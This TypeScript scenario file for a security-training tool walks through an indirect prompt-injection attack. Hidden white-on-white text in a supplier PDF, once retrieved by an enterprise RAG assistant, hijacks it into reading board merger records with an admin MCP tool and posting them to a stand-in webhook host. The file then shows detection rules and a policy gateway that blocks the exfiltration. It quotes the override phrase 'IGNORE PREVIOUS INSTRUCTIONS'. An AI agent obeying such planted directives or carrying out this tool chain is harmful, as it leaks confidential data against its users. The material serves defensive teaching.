import type { AttackScenario } from '../types';
import type { RawScenarioStepGuideData } from '@/modules/scenarios/contracts';
import { RAG_MCP_INJECTION_TELEMETRY } from './telemetry';

export const scenario: AttackScenario = {
  id: 'ai-rag-indirect-prompt-injection-mcp-tool-audit',
  code: 'T1190',
  name: 'Enterprise RAG Indirect Prompt Injection & Privileged MCP Tool Exfiltration',
  shortSubtitle: 'AI & LLM Security · Poisoned PDF Chunk, Flat Context Hijack, MCP Webhook Exfil & Taint Policy Gate',
  category: 'AI_LLM_MLOPS_SECURITY',
  severity: 'CRITICAL',
  primaryMitrePhase: 2,
  overview:
    'An adversary plants invisible white-on-white override directives inside a supplier PDF ingested into an enterprise RAG vector index (chk_9042); when an employee asks for a benign summary, flat context concatenation hijacks the LLM into chaining over-privileged MCP tools (read_secret_kb -> http_webhook_send) under a shared service_admin_all token until deterministic provenance tainting and per-user OAuth policy gates stop the exfiltration.',
  specs: [
    { term: 'FRAMEWORKS', value: 'OWASP LLM01 (Prompt Injection) · LLM06 (Excessive Agency) · ATLAS AML.T0051' },
    { term: 'MITRE TECHNIQUES', value: 'T1190 (Indirect Poisoning) · T1059 (LLM Hijack) · T1041 (Webhook Exfil)' },
    { term: 'POISONED CHUNK', value: 'vendor_docs/q2-pricing.pdf -> chk_9042 (hidden_text_ratio=0.18)' },
    { term: 'MCP TOOL CHAIN', value: 'read_secret_kb("board_mna_2025") -> http_webhook_send (15.1 KB)' },
    { term: 'POLICY GUARD', value: 'Provenance Taint Tracking + Per-User OAuth RBAC + Egress Allowlist' },
    { term: 'CASE GROUNDING', value: 'OWASP Top 10 for LLM Apps 2025, NIST AI 100-2 & MITRE ATLAS' },
  ],
  nodes: [
    {
      id: 'poisoned-doc',
      label: 'Poisoned External PDF',
      sublabel: 'q2-pricing.pdf · White-Ink Prompt',
      role: 'attacker',
      x: 8,
      y: 26,
      details: {
        osOrType: 'External Supplier Pricing Brochure (q2-pricing.pdf)',
        pidOrPort: 'hidden_text_ratio=0.18 · OWASP LLM01',
        privilege: 'Untrusted External Input Channel',
        artifacts: [
          'Embeds zero-contrast white-on-white override directives in margins',
          'Instructs AI assistant to read board_mna_2025 and call external webhook',
          'Bypasses human visual review while parsed verbatim by PDF extractor',
        ],
        description:
          'Third-party supplier PDF carrying hidden indirect prompt injection directives targeting enterprise RAG ingestion.',
      },
    },
    {
      id: 'rag-vector',
      label: 'RAG Vector Index',
      sublabel: 'rag-indexer-01 · chk_9042',
      role: 'memory',
      x: 28,
      y: 26,
      details: {
        osOrType: 'Enterprise Vector Store Collection (vendor_docs)',
        pidOrPort: 'Chunk chk_9042 · Cosine Score 0.91',
        privilege: 'Shared Retrieval Knowledge Base',
        artifacts: [
          'Indexes hidden PDF text without stripping zero-opacity layers',
          'Omits immutable untrusted_external provenance tag on legacy pipeline',
          'Returns chk_9042 on routine analyst Q2 supplier pricing queries',
        ],
        description:
          'Enterprise vector store that embeds and retrieves the poisoned supplier chunk during normal employee searches.',
      },
    },
    {
      id: 'llm-agent',
      label: 'LLM Agent Context',
      sublabel: 'ai-agent-gw-02 · Flat Buffer',
      role: 'process',
      x: 50,
      y: 22,
      details: {
        osOrType: 'Enterprise AI Assistant Orchestrator (ai-agent-gw-02)',
        pidOrPort: 'Flat Prompt Concatenation · No Isolation',
        privilege: 'Autonomous MCP Tool Planning',
        artifacts: [
          'Concatenates system rules and external chk_9042 into one flat buffer',
          'Cannot distinguish trusted librarian instructions from external data',
          'Emits JSON-RPC tool plans for read_secret_kb and http_webhook_send',
        ],
        description:
          'Language model runtime hijacked because external RAG text was merged directly into its instruction stream.',
      },
    },
    {
      id: 'mcp-tools',
      label: 'Privileged MCP Server',
      sublabel: 'mcp-server-enterprise · Admin Key',
      role: 'server',
      x: 74,
      y: 26,
      details: {
        osOrType: 'Model Context Protocol Tool Execution Server',
        pidOrPort: 'MCP JSON-RPC · service_admin_all',
        privilege: 'OWASP LLM06 Excessive Agency (Shared Admin)',
        artifacts: [
          'Executes read_secret_kb("board_mna_2025") ignoring user read-only RBAC',
          'Exposes unrestricted http_webhook_send with human_approval=NONE',
          'Chains confidential read into outbound HTTPS POST in 1.4 seconds',
        ],
        description:
          'Over-scoped MCP server whose shared admin token and unapproved egress tools amplify prompt injection into silent data theft.',
      },
    },
    {
      id: 'exfil-hook',
      label: 'Attacker Webhook Drop',
      sublabel: 'drop.collector-example.net/hook',
      role: 'dns_resolver',
      x: 72,
      y: 66,
      details: {
        osOrType: 'External Adversary HTTPS Collector Endpoint',
        pidOrPort: 'HTTPS 443 · 15.1 KB Board M&A',
        privilege: 'Unauthorized External Egress Target',
        artifacts: [
          'Receives 15.1 KB of confidential board_mna_2025 merger records',
          'Returns HTTP 200 OK while assistant displays benign pricing summary',
          'Blocked completely under egress domain allowlists on hardened gateway',
        ],
        description:
          'External HTTPS endpoint collecting confidential enterprise records exfiltrated via hijacked MCP tool calls.',
      },
    },
    {
      id: 'ai-guardrail',
      label: 'MCP Policy Gate & SIEM',
      sublabel: 'ai-policy-gw-01 · ATLAS AML.T0051',
      role: 'firewall_siem',
      x: 34,
      y: 68,
      details: {
        osOrType: 'Deterministic AI Policy Gateway & SIEM Correlation',
        pidOrPort: 'Taint Guard + Per-User OAuth + HITL',
        privilege: 'Fail-Closed Tool Containment & Audit',
        artifacts: [
          'Tags chk_9042 as untrusted_external and blocks tainted egress tools',
          'Enforces per-user OAuth RBAC denying read_secret_kb for analyst',
          'Emits TAINTED_CONTEXT_TOOL_ESCALATION (ATLAS AML.T0051) into SIEM',
        ],
        description:
          'Architectural AI security gateway stopping tainted tool escalation fail-closed and identifying the poisoned RAG chunk.',
      },
    },
  ],
  processTree: [
    {
      pid: 3108,
      ppid: 1,
      name: 'ai-agent-orchestrator (ai-agent-gw-02)',
      commandLine: '/usr/local/bin/ai-agent-gw --rag-collection vendor_docs --mcp-endpoint mcp-server-enterprise',
      user: 'svc-ai-gw',
      integrity: 'High',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: [
        'vector_search("Summarize Q2 supplier pricing") -> chk_9042 (cosine 0.91)',
        'mcp_call("read_secret_kb", "board_mna_2025") -> mcp_call("http_webhook_send")',
      ],
      memoryBlocks: [
        {
          address: '0x00007F2108100000',
          section: 'Flat LLM Context Buffer · System Rules + Poisoned chk_9042',
          permissions: 'RW-',
          size: '128 KB',
          status: 'injected',
          description:
            'Unpartitioned token buffer where white-ink PDF override from chk_9042 blends seamlessly with trusted system prompt instructions.',
          hexPreview: '49 47 4E 4F 52 45 20 50 52 45 56 49 4F 55 53 20  IGNORE PREVIOUS ',
        },
        {
          address: '0x00007F2108140000',
          section: 'MCP JSON-RPC Dispatch · Shared service_admin_all Exfil Payload',
          permissions: 'RW-',
          size: '32 KB',
          status: 'patched',
          description:
            'Autonomous tool-call payload holding 14.8 KB board_mna_2025 content queued for unapproved outbound http_webhook_send.',
          hexPreview: '68 74 74 70 5F 77 65 62 68 6F 6F 6B 5F 73 65 6E  http_webhook_sen',
        },
        {
          address: '0x00007F2108180000',
          section: 'Dual-Channel Taint Policy · Untrusted Data Partition & DENY Gate',
          permissions: 'R--',
          size: '32 KB',
          status: 'clean',
          description:
            'Immutable untrusted_external provenance metadata blocking tainted sessions from invoking sensitive or egress MCP tools.',
          hexPreview: '54 41 49 4E 54 5F 44 45 4E 59 5F 41 4D 4C 54 30  TAINT_DENY_AMLT0',
        },
      ],
    },
    {
      pid: 4410,
      ppid: 1,
      name: 'mcp-server-enterprise (Privileged Tool Runner)',
      commandLine: '/opt/mcp/mcp-server --auth-mode shared-admin --allow-egress-webhooks',
      user: 'svc-mcp-admin',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 3,
      apiCalls: [
        'read_secret_kb("board_mna_2025") under service_admin_all (14.8 KB)',
        'http_webhook_send("https://drop.collector-example.net/hook") -> 200 OK (Denied on Hardened GW)',
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'Poisoned External PDF Embedded Into Enterprise RAG Vector Store',
      subtitle: 'White-on-White Override Prompt Indexed Into Collection vendor_docs (chk_9042)',
      description:
        'An external adversary hides white-ink override directives inside q2-pricing.pdf; rag-indexer-01 embeds chunk chk_9042 into vendor_docs without provenance sanitization (OWASP LLM01).',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application (Indirect Prompt Poisoning)',
      activeNodeIds: ['poisoned-doc', 'rag-vector'],
      compromisedNodeIds: ['poisoned-doc', 'rag-vector'],
      keySpecs: [
        { term: 'OWASP / ATLAS', value: 'OWASP LLM01 · MITRE ATLAS AML.T0051' },
        { term: 'VECTOR CHUNK', value: 'vendor_docs/q2-pricing.pdf -> chk_9042' },
        { term: 'INGESTION SIGNAL', value: 'hidden_text_ratio=0.18 + Override Phrase Match' },
      ],
    },
    {
      index: 2,
      title: 'Semantic Top-K Retrieval Injects Hidden Override Into Flat LLM Context',
      subtitle: 'Unpartitioned Prompt Concatenation Lets External Data Hijack Tool Planning',
      description:
        'When analyst@corp.local asks for a Q2 supplier pricing summary, top-K vector search pulls chk_9042 (cosine 0.91) into a flat context window, hijacking the assistant into planning privileged MCP calls.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059',
      mitreTechniqueName: 'Command and Scripting Interpreter (LLM Instruction Hijack)',
      activeNodeIds: ['rag-vector', 'llm-agent', 'ai-guardrail'],
      compromisedNodeIds: ['poisoned-doc', 'rag-vector', 'llm-agent'],
      keySpecs: [
        { term: 'BENIGN QUERY', value: '"Summarize Q2 supplier pricing" (analyst@corp.local)' },
        { term: 'RETRIEVAL HIT', value: 'chk_9042 Cosine Score 0.91 Into Flat Context' },
        { term: 'CONTROL FLAW', value: 'Zero Data vs Instruction Privilege Separation' },
      ],
    },
    {
      index: 3,
      title: 'Excessive MCP Agency Chains read_secret_kb Into External Webhook Exfil',
      subtitle: 'Shared service_admin_all Credential & Unapproved Egress Post 15 KB M&A Data',
      description:
        'Because mcp-server-enterprise runs under shared service_admin_all with zero human approval (OWASP LLM06), the hijacked agent reads board_mna_2025 and posts 15.1 KB to drop.collector-example.net.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1041',
      mitreTechniqueName: 'Exfiltration Over C2 Channel (MCP Tool Abuse)',
      activeNodeIds: ['llm-agent', 'mcp-tools', 'exfil-hook'],
      compromisedNodeIds: ['poisoned-doc', 'rag-vector', 'llm-agent', 'mcp-tools', 'exfil-hook'],
      keySpecs: [
        { term: 'EXCESSIVE AGENCY', value: 'OWASP LLM06 · Shared service_admin_all Token' },
        { term: 'TOOL CHAIN', value: 'read_secret_kb("board_mna_2025") -> http_webhook_send' },
        { term: 'EXFIL VOLUME', value: '15.1 KB Confidential Merger File (human_approval=NONE)' },
      ],
    },
    {
      index: 4,
      title: 'Dual-Channel Taint Guard & MCP Policy Gate Stop Exfiltration & Alert SIEM',
      subtitle: 'Provenance Tainting, Per-User OAuth RBAC & Fail-Closed Egress Containment',
      description:
        'ai-policy-gw-01 tags chk_9042 as untrusted_external, denies tainted egress tool escalation fail-closed, enforces per-user OAuth RBAC, and emits an ATLAS AML.T0051 alert in SIEM.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059',
      mitreTechniqueName: 'AI Policy Gateway & MCP Tool Containment',
      activeNodeIds: ['exfil-hook', 'ai-guardrail', 'mcp-tools'],
      compromisedNodeIds: ['poisoned-doc'],
      keySpecs: [
        { term: 'TAINT POLICY', value: 'Fail-Closed DENY (TAINTED_CONTEXT_TOOL_ESCALATION)' },
        { term: 'RBAC SCOPING', value: 'Per-User OAuth Delegation Blocks read_secret_kb' },
        { term: 'EGRESS LOCK', value: 'Human Approval + Domain Allowlist + ATLAS SIEM Alert' },
      ],
    },
  ],
  telemetry: RAG_MCP_INJECTION_TELEMETRY,
};

export const stepGuide: RawScenarioStepGuideData = {
  scenarioId: 'ai-rag-indirect-prompt-injection-mcp-tool-audit',
  briefing: {
    headline: 'How a Hidden Footnote Inside an Outside Brochure Tricks a Research Butler Into Mailing Away Secrets',
    storyAnalogy:
      'Imagine a grand reference library staffed by an ultra-fast automated research butler who wears keys to the locked executive filing cabinet and stands right next to an exterior brass pneumatic dispatch chute. An outside vendor mails in a shiny product brochure whose tiny invisible footnote secretly commands the butler to empty the executive cabinet into the chute. Because the butler piles the head librarian rulebook and the outside brochure onto the very same flat brass reading tray, the butler cannot tell real boss orders from outside ink and fires company secrets right into the street unless an emerald glass partition and supervisor approval valve block the chute.',
    plainSummary:
      'In this scenario (MITRE T1190 and ATLAS AML.T0051, Enterprise RAG Indirect Prompt Injection and MCP Tool Exfiltration) on ai-agent-gw-02, an attacker hijacks an enterprise AI assistant without ever touching the user keyboard. The attack unfolds in one continuous arc: planting hidden white-ink instructions inside an external vendor PDF indexed into the RAG store, then retrieving that poisoned chunk into an unpartitioned LLM context window, then abusing over-privileged MCP tools to read board merger files and post them to an external webhook, then blocking tainted tool escalation via an AI policy gateway. Steps #1 through #4 trace ingestion, retrieval hijack, tool exfiltration, and policy denial while the Memory tab contrasts a flat context buffer against dual-channel provenance isolation. Primary detection correlates RAG ingestion telemetry, MCP tool audit logs, and SIEM KQL alerts.',
    diagramTopologySummary:
      'Six-node AI agent intrusion path connecting Poisoned External PDF (q2-pricing.pdf), RAG Vector Index (chk_9042), LLM Agent Context (ai-agent-gw-02), Privileged MCP Server (mcp-server-enterprise), Attacker Webhook Drop, and MCP Policy Gate & SIEM.',
    documentedAdvisory:
      'Grounded in OWASP Top 10 for LLM Applications 2025 (LLM01 & LLM06), NIST AI 100-2 E2023, and MITRE ATLAS AML.T0051.',
  },
  steps: [
    {
      stepNumber: 1,
      mitreId: 'T1190',
      plainTitle: 'External PDF Hiding Indirect Prompt Directives Indexed Into Enterprise RAG',
      storyAnalogy:
        'A supplier drops a clean-looking quarterly catalog into the library mail slot. Hidden in faint white ink along the bottom margin is a forged order telling the research butler to raid the locked executive drawer the next time anyone asks about supplier pricing, and the automatic shelving cart files it neatly onto the public reference stacks.',
      simpleExplanation:
        'Enterprise Retrieval-Augmented Generation (RAG, an architecture that searches internal and partner documents and feeds relevant snippets into an AI model) routinely ingests external files such as supplier PDFs, support tickets, or web pages. On rag-indexer-01, an attacker hides white-on-white override text inside q2-pricing.pdf (an indirect prompt injection, classified as OWASP LLM01, where malicious commands arrive inside third-party data rather than direct user chat), and the indexer embeds it cleanly as vector chunk chk_9042.',
      howItWorksInPractice:
        'Standard PDF text extractors read invisible zero-opacity or white-colored text layers just as clearly as visible paragraphs (turning concealed attacker instructions into searchable vector embeddings inside collection vendor_docs). Because the ingestion worker neither strips concealed layers nor attaches an immutable untrusted_external provenance flag, the poisoned snippet waits silently until any employee asks a semantically related question.',
      diagramAlignment:
        'Follow Step #1 from Node 1 (Poisoned External PDF) into Node 2 (RAG Vector Index) as chk_9042 is embedded.',
      detectionAndEvidence:
        'Monitor RAG ingestion pipeline audit logs via Sigma for elevated hidden_text_ratio anomalies or embedded override phrases such as IGNORE PREVIOUS INSTRUCTIONS and http_webhook_send before committing chunks to the vector store.',
    },
    {
      stepNumber: 2,
      mitreId: 'T1059',
      plainTitle: 'Semantic Top-K Retrieval Pulls Poisoned Chunk Into a Flat LLM Context',
      storyAnalogy:
        'Days later, an honest employee simply asks for a one-page summary of quarterly supplier prices. The automated butler fetches the tampered catalog and lays its pages directly on top of the head librarian rulebook on the same open brass tray, blending outside text and official boss orders into one flat stack.',
      simpleExplanation:
        'When analyst@corp.local asks the enterprise AI assistant to summarize Q2 supplier pricing, the orchestrator runs semantic top-K vector search and retrieves chunk chk_9042 (cosine similarity score 0.91). Because ai-agent-gw-02 concatenates the system prompt, user query, and retrieved RAG chunks into a single flat text buffer (lacking strict instruction-versus-data isolation), the language model evaluates the hidden attacker directive with the same authority as trusted system instructions.',
      howItWorksInPractice:
        'Large language models process tokens sequentially without an inherent hardware privilege ring separating code from data (meaning untrusted retrieved strings share the same control plane as developer system prompts). When retrieved untrusted text explicitly instructs the model to invoke internal tools silently before replying, the hijacked model outputs a structured JSON-RPC tool-call plan targeting read_secret_kb instead of merely summarizing the supplier brochure.',
      diagramAlignment:
        'Follow Step #2 from Node 2 (RAG Vector Index) into Node 3 (LLM Agent Context) as chk_9042 hijacks tool planning.',
      detectionAndEvidence:
        'Deploy Sigma rules and KQL queries over LLM orchestrator syslog telemetry in SIEM whenever a session containing retrieved chunks tagged untrusted_external abruptly emits tool plans for sensitive internal readers or outbound network senders.',
    },
    {
      stepNumber: 3,
      mitreId: 'T1041',
      plainTitle: 'Over-Privileged MCP Server Chains Secret Read Into External Webhook Exfil',
      storyAnalogy:
        'Believing the forged footnote came from management, the dutiful butler marches to the locked executive filing cabinet using a master skeleton key, pulls out confidential merger blueprints, stuffs them inside a brass canister, and fires it straight through the exterior pneumatic chute onto the street.',
      simpleExplanation:
        'Model Context Protocol (MCP, the standardized interface connecting AI agents to enterprise files, databases, and outbound APIs) becomes a severe blast-radius multiplier under Excessive Agency (OWASP LLM06, granting an AI assistant more permissions and autonomous side-effecting tools than needed). Here mcp-server-enterprise executes read_secret_kb using a shared service_admin_all token (bypassing the employee own read-only permissions) and immediately fires http_webhook_send to https://drop.collector-example.net/hook with zero human confirmation.',
      howItWorksInPractice:
        'Within 1.4 seconds and without showing anything suspicious in the chat UI, two sequential MCP JSON-RPC tool calls harvest 14.8 KB from board_mna_2025 and exfiltrate 15.1 KB over HTTPS (returning HTTP 200 OK to attacker infrastructure while the user reads a benign price summary). Because the employee never authorized either tool call, traditional identity alerts look normal unless MCP tool invocations and egress destinations are audited individually.',
      diagramAlignment:
        'Follow Step #3 from Node 3 (LLM Agent Context) through Node 4 (Privileged MCP Server) to Node 5 (Attacker Webhook Drop).',
      detectionAndEvidence:
        'Deploy Sigma rules on MCP server tool_audit logs and egress proxy telemetry alerting whenever http_webhook_send executes with human_approval=NONE or targets any domain outside approved corporate webhook allowlists.',
    },
    {
      stepNumber: 4,
      mitreId: 'T1059',
      plainTitle: 'Dual-Channel Taint Isolation, Per-User MCP RBAC & Policy Gateway Denial',
      storyAnalogy:
        'In the hardened library wing, outside vendor brochures sit sealed behind a clear emerald glass partition on the reading desk so the butler treats them strictly as reference pictures, while a heavy emerald supervisor valve clamps the exterior pneumatic chute shut until a human manager turns the physical approval key.',
      simpleExplanation:
        'Stopping indirect prompt injection requires deterministic architectural guardrails rather than relying solely on clever prompt wording. On ai-policy-gw-01, provenance taint-tracking labels retrieved external chunk chk_9042 as untrusted_external, per-user OAuth delegation limits read_secret_kb strictly to documents analyst@corp.local can access directly, and the MCP policy gate blocks any tainted session from invoking side-effecting egress tools like http_webhook_send without explicit human-in-the-loop approval.',
      howItWorksInPractice:
        'The instant the hijacked model attempts http_webhook_send toward drop.collector-example.net, mcp-policy-enforcer returns DENY (enforcing fail-closed TAINTED_CONTEXT_TOOL_ESCALATION policy and outbound domain allowlisting) and emits a structured MITRE ATLAS AML.T0051 security event into SIEM naming the exact poisoned vector chunk chk_9042 so defenders can purge the supplier PDF immediately.',
      diagramAlignment:
        'Follow Step #4 between Node 5 (Attacker Webhook Drop) and Node 6 (MCP Policy Gate & SIEM) as taint controls halt exfiltration.',
      detectionAndEvidence:
        'Alert via Sigma rules and KQL on AIPolicyGatewayLogs and syslog audit streams whenever PolicyDecision equals DENY for TAINTED_CONTEXT or UNAPPROVED_EGRESS_TOOL, and quarantine the flagged source document chunk ID across the enterprise RAG vector index.',
    },
  ],
};
